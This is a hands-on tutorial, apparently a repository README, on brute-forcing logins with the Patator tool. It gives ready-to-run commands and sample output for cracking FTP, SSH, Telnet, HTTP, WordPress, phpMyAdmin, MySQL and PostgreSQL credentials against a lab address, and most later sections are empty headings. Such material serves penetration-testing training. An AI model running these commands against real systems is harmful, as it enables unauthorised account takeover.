# Patator

## Introduction
Patator is a multi-threaded tool written in Python for brute-forcing a variety of services (FTP, SSH, Telnet, SMTP, HTTP, MYSQL, VNC and so on).
In this paper I will show you some pratical usage examples to became a Patator Ninja.

### Download
https://github.com/lanjelot/patator
The repository is a good point to search for dependencies and other details.
Thanks to [lanjelot](https://twitter.com/lanjelot) for his time and work.

### Patator Structure
The behaviour and functions of patator can be split into modules, each module has a specific functionality, e.g., `http_fuzz`, `ftp_login` and so on.
Some of the flags used within patator are common to all modules, while other are module specific.

##  Brute-Force

In these pratical examples we will commonly use the following flags:
 - host: Parameter for target ip address;
 - user: username to use or file to use (FILE+NUMBER es. FILE0 , it means that parameter 0 will contain the users file);
 - 0: In this case parameter used to indicate users file;
 - password: password to use or file to use (FILE+NUMBER es. FILE1, it means that parameter 1 will contain pass file);
 - 1:  In this case parameter used to indicate pass file;
 - x: Flag to indicate actions:conditions, in this case we ignore (and it doesn't print) incorrect credentials.

### FTP
In order to perform an SSH credentials bruteforce we are going to
use the `ftp_login` module.
```sh
./patator.py ftp_login host=IPADDRESS user=FILE0 password=FILE1 0=user.txt 1=pass.txt -x ignore:mesg='Login incorrect.'
```

Module options:
```
host          : target host
port          : target port [21]
user          : usernames to test
password      : passwords to test
tls           : use TLS [0|1]
timeout       : seconds to wait for a response [10]
persistent    : use persistent connections [1|0]
```
Output example:
```
11:30:55 patator    INFO - Starting Patator v0.7 (https://github.com/lanjelot/patator) at 2018-08-09 11:30 CEST
11:30:55 patator    INFO -                                                                              
11:30:55 patator    INFO - code  size    time | candidate                          |   num | mesg
11:30:55 patator    INFO - -----------------------------------------------------------------------------
11:30:56 patator    INFO - 230   19     0.081 | test:root                          |    18 | User test logged in
```

### SSH
In order to perform an SSH credentials bruteforce we are going to
use the `ssh_login` module.

```sh
./patator.py ssh_login host=IPADDRESS user=FILE0 password=FILE1 0=user.txt 1=pass.txt -x ignore:mesg='Authentication failed.'
```
 
Module options:
```
host          : target host
port          : target port [22]
user          : usernames to test
password      : passwords to test
auth_type     : type of password authentication to use [password|keyboard-interactive|auto]
keyfile       : file with RSA, DSA or ECDSA private key to test
persistent    : use persistent connections [1|0]
```
Output example:
```
11:37:49 patator    INFO - Starting Patator v0.7 (https://github.com/lanjelot/patator) at 2018-08-09 11:37 CEST
11:37:49 patator    INFO -                                                                              
11:37:49 patator    INFO - code  size    time | candidate                          |   num | mesg
11:37:49 patator    INFO - -----------------------------------------------------------------------------
11:37:53 patator    INFO - 0     38     0.101 | test:root                          |    18 | SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u3
11:38:14 patator    INFO - Hits/Done/Skip/Fail/Size: 1/81/0/0/81, Avg: 3 r/s, Time: 0h 0m 25s
```
### TELNET
In order to perform a telnet credentials bruteforce we are going to
use the `telnet_login` module.
```sh
./patator.py telnet_login host=IPADDRESS inputs='FILE0\nFILE1' 0=user.txt 1=pass.txt persistent=0 prompt_re='Username:|Password:' -x ignore:egrep='incorrect|Password'
 ```

Module options:
```
host          : target host
port          : target port [23]
inputs        : list of values to input
prompt_re     : regular expression to match prompts [\w+:]
timeout       : seconds to wait for a response and for prompt_re to match received data [20]
persistent    : use persistent connections [1|0] 
```
Output example:
```
12:14:11 patator    INFO - Starting Patator v0.7 (https://github.com/lanjelot/patator) at 2018-08-09 12:14 CEST
12:14:11 patator    INFO -                                                                              
12:14:11 patator    INFO - code  size    time | candidate                          |   num | mesg
12:14:11 patator    INFO - -----------------------------------------------------------------------------
12:15:32 patator    INFO - 0     477   20.085 | test:root                          |    18 |  \r\nLast login: Thu Aug  9 05:09:44 CDT 2018 from 192.168.0.6 on pts/9\r\nLinux debian 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1+deb9u1 (2018-05-07) x86_64\r\n\r\nThe programs included with the Debian GNU/Linux system are free software;\r\nthe exact distribution terms for each program are described in the\r\nindividual files in /usr/share/doc/*/copyright.\r\n\r\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\r\npermitted by applicable law.\r\ntest@debian:~$ 
12:20:12 patator    INFO - Hits/Done/Skip/Fail/Size: 1/81/0/0/81, Avg: 0 r/s, Time: 0h 6m 0s
 ```

### HTTP/HTTPS
In order to perform an HTTP/HTTPS credentials bruteforce we are going to
use the `http_fuzz` module.

#### Basic usage
A basic HTTP/S example in order to use patator as a sort of resource/directory buster.
```sh
./patator.py http_fuzz url=http://192.168.0.7/FILE0 0=list.txt follow=1 -x ignore:code=404 -x ignore,retry:code=500
```
What happens here is that:

- `follow=1`: we are following eventual redirects
- `-x ignore:code=404`: we ignore 404 response code pages
- `-x ignore,retry:code=500`: we retry when code 500 is used

 
#### HTTP Basic Authentication
```sh
./patator.py http_fuzz url=http://192.168.0.7:80/ user_pass=FILE0:FILE1 0=user.txt 1=pass.txt -x ignore:code=401
 ```
 
Example output:
```
15:38:17 patator    INFO - Starting Patator v0.7 (https://github.com/lanjelot/patator) at 2018-08-09 15:38 CEST
15:38:17 patator    INFO -                                                                              
15:38:17 patator    INFO - code size:clen       time | candidate                          |   num | mesg
15:38:17 patator    INFO - -----------------------------------------------------------------------------
15:38:17 patator    INFO - 200  10956:10701    0.022 | test:root                          |    18 | HTTP/1.1 200 OK
15:38:18 patator    INFO - Hits/Done/Skip/Fail/Size: 1/81/0/0/81, Avg: 133 r/s, Time: 0h 0m 0s
```
#### Wordpress Admin Login
```sh
./patator.py http_fuzz url=http://192.168.0.7/wp-login.php method=POST body='log=FILE0&pwd=FILE1' 0=user.txt 1=pass.txt -x ignore:egrep='200'

```
Example output:
```
16:53:25 patator    INFO - Starting Patator v0.7 (https://github.com/lanjelot/patator) at 2018-08-09 16:53 CEST
16:53:25 patator    INFO -                                                                              
16:53:25 patator    INFO - code size:clen       time | candidate                          |   num | mesg
16:53:25 patator    INFO - -----------------------------------------------------------------------------
16:53:26 patator    INFO - 302  1015:0         0.384 | test:root                          |    18 | HTTP/1.1 302 Found
16:53:28 patator    INFO - Hits/Done/Skip/Fail/Size: 1/81/0/0/81, Avg: 26 r/s, Time: 0h 0m 3s
```

Wordpress behaviour is quite atypical, since it will reply with a 200 response code when the login fails, and with a redirecation 3XX response code when the login is successful.

#### PHPmyadmin
```sh
./patator.py http_fuzz url=http://192.168.0.7/phpmyadmin/index.php accept_cookie=1 method=POST body='pma_username=FILE0&pma_password=FILE1' 0=user.txt 1=pass.txt -x ignore:fgrep='Cannot log in to the MySQL server' follow=1 -l test
 ```
 - `-l test`:  this flag is used to save the results in test folder

Output example: 
```
17:19:39 patator    INFO - Starting Patator v0.7 (https://github.com/lanjelot/patator) at 2018-08-09 17:19 CEST
17:19:39 patator    INFO -                                                                              
17:19:39 patator    INFO - code size:clen       time | candidate                          |   num | mesg
17:19:39 patator    INFO - -----------------------------------------------------------------------------

17:19:40 patator    INFO - 200  11715:-1       0.214 | anonymous:user                     |    47 | HTTP/1.1 200 OK
17:19:41 patator    INFO - 200  11706:-1       0.253 | nobody:rooted                      |    41 | HTTP/1.1 200 OK
17:19:41 patator    INFO - 200  11703:-1       0.208 | crack:test                         |    55 | HTTP/1.1 200 OK
17:19:41 patator    INFO - 200  11715:-1       0.267 | anonymous:test                     |    46 | HTTP/1.1 200 OK
17:19:41 patator    INFO - 200  78349:-1       1.104 | test:root                          |    18 | HTTP/1.1 200 OK
17:19:41 patator    INFO - 200  11703:-1       0.185 | crack:rooted                       |    59 | HTTP/1.1 200 OK
17:19:41 patator    INFO - 200  11715:-1       0.198 | anonymous:pass                     |    53 | HTTP/1.1 200 OK
```
The right credentials are test:root because of server response time, but this isn't an acceptable reason for us.
It show us that each request has 200 OK as response, now let's analyze our result in test folder.
```
RESULTS.csv  RESULTS.xml  RUNTIME.log  10_200-12753:-1-0.244.txt  22_200-11709:-1-0.314.txt  35_200-11656:-1-0.308.txt  48_200-11715:-1-0.121.txt  61_200-11703:-1-0.291.txt  73_200-11709:-1-0.193.txt and so on..
```
We can now use our script that analyze the content of these results:
```
./patator_help_script.sh test/ "denied"
test//18_200-78366:-1-1.523.txt
Your good credentials are in test number: 
test//18
```
 (./patator_help_script.sh FOLDERNAME  STRINGWEWANTTOFIND)
 So right credentials are in 18th test:
 ```
 17:19:41 patator    INFO - 200  78349:-1       1.104 | test:root                      | -----> 18 <----- | HTTP/1.1 200 OK
 ```

#### Generic GET form
```sh
./patator.py http_fuzz url='http://192.168.0.7/login.php?username=FILE0&password=FILE1&login=' 0=user.txt 1=pass.txt -l test method=GET
```
Output get us status 200 all times. So:
```sh
./patator_help_script.sh test/ "Wrong"
test//18_200-2965:-1-0.035.txt
Your good credentials are in test number: 
test//18
```
### MySQL
In order to perform MySQL credentials bruteforce we are going to
use the mysql_login module.
```sh
./patator.py mysql_login host=IPADDRESS user=FILE0 password=FILE1 0=user.txt 1=pass.txt -x ignore:fgrep="Access denied"
```
Output:
```                                                                           
09:53:28 patator    INFO - code  size    time | candidate                          |   num | mesg
09:53:28 patator    INFO - -----------------------------------------------------------------------------
09:53:28 patator    INFO - 0     6      0.003 | root:toor                          |    10 | 5.7.17
09:53:28 patator    INFO - Hits/Done/Skip/Fail/Size: 1/90/0/0/90, Avg: 149 r/s, Time: 0h 0m 0s
```
Module options:
```
  host          : target host
  port          : target port [3306]
  user          : usernames to test
  password      : passwords to test
  timeout       : seconds to wait for a response [10]
```
### PostgreSQL
In order to perform PostgreSQL credentials bruteforce we are going to
use the `pgsql_login` module.
```sh
./patator.py  pgsql_login host=IPADDRESS user=FILE0 password=FILE1 0=user.txt  1=pass.txt -x ignore:egrep='exist|failed'
```
In this case we avoid not existing users and failed authentications.
Output:
```
10:59:18 patator    INFO - code  size    time | candidate                          |   num | mesg
10:59:18 patator    INFO - -----------------------------------------------------------------------------
10:59:23 patator    INFO - 0     2      0.470 | testuser:postgres                  |   110 | OK
10:59:23 patator    INFO - Hits/Done/Skip/Fail/Size: 1/110/0/0/110, Avg: 24 r/s, Time: 0h 0m 4s
```
Module options:
```
  host          : target host
  port          : target port [5432]
  user          : usernames to test
  password      : passwords to test
  database      : databases to test [postgres]
  timeout       : seconds to wait for a response [10]
```
### Oracle (work in progress)
In order to perform Oracle database credentials bruteforce we are going to
use the `oracle_login` module.
```sh
./patator.py oracle_login host=IPADDRESS user=FILE0 password=FILE1 0=user.txt 1=pass.txt -x ignore:code=ORA-01017
```
Module options:
```
  host          : hostnames or subnets to target
  port          : ports to target [1521]
  user          : usernames to test
  password      : passwords to test
  sid           : sid to test
  service_name  : service name to test
```
### MSSQL (work in progress)
In order to perform Microsoft database bruteforce we are going to
use the `mssql_login` module.
Install dependencies and let's go.
* pyopenssl 17.5.0 (https://pyopenssl.org/)
* impacket 0.9.12 (https://github.com/CoreSecurity/impacket)
```sh
pip install pyopenssl
pip install impacket
./patator.py mssql_login host=IPADDRESS user=FILE0 password=FILE1 0=user.txt 1=pass.txt -x ignore:fgrep='Login failed for user'
```
### VNC


### SMTP (work in progress)
### RDP Gateway
### AJP
### POP
### poppassd
### IMAP
### LDAP
### SMB
### SMB SID-lookup
### rlogin
### VMWare Authentication Daemon
### RDP
### DNS
### DNS (reverse lookup subnets)
### SNMPv1/2 and SNMPv3
### ZIP Files
### Java Keystroke files
### SQLCipher-encrypted databases

## Enumeration 
### Users (SMTP)  using SMTP VRFY command
### Users (SMTP) using SMTP RCPT TO command
### Users using Finger
### IKE transforms (Internet Key Exchange)

## Others examples
### Crack Umbraco HMAC-SHA1 password hashes
